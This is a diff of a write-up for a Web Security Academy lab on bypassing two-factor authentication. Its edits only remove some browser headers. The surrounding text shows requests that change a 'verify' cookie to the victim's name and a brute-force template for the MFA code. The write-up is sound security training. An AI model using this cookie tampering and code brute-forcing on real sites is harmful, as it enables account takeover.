@@ -72,9 +72,7 @@ While logged in, I checked Burp's Proxy HTTPS history and noticed a request to `
 GET /login2 HTTP/2
 Host: 0aa6003304fa33f7801930d300980098.web-security-academy.net
 Cookie: session=0yI9369ul994nbhhyZ30GREj68nnmB2z; verify=wiener
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 Referer: https://0aa6003304fa33f7801930d300980098.web-security-academy.net/login
-Te: trailers
 ```
 
 The `verify` cookie caught my attention.
@@ -89,8 +87,6 @@ I sent this request in Repeater:
 GET /login2 HTTP/2
 Host: 0aa6003304fa33f7801930d300980098.web-security-academy.net
 Cookie: verify=carlos
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
-Te: trailers
 ```
 
 And it worked.
@@ -112,12 +108,8 @@ Host: 0aa6003304fa33f7801930d300980098.web-security-academy.net
 
 Cookie: verify=carlos
 
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 13
 Origin: https://0aa6003304fa33f7801930d300980098.web-security-academy.net
 Referer: https://0aa6003304fa33f7801930d300980098.web-security-academy.net/login2
-Te: trailers
 
 mfa-code=%s
 ```
